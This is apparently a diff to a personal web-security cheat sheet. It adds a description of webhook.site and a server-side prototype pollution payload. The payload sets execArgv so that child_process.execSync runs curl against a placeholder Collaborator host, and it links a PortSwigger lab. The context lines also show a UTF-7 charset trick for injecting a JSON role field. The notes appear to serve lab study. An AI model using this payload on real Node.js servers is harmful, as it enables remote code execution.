@@ -186,3 +186,18 @@ utf -7::"role":"+AGYAbwBv-"
         "content-type": "application/json; charset=utf-7"
     }
 ```
+## webhook site
+```
+Webhook.site lets you easily inspect, test and create advanced scripts and workflows for any incoming HTTP request or e-mail. 
+
+Any requests or emails sent to these addresses will be logged here instantly — you don't even have to refresh!
+```
+## child process -rce
+```
+"__proto__": {
+    "execArgv":[
+        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
+    ]
+}
+read:::https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution
+```
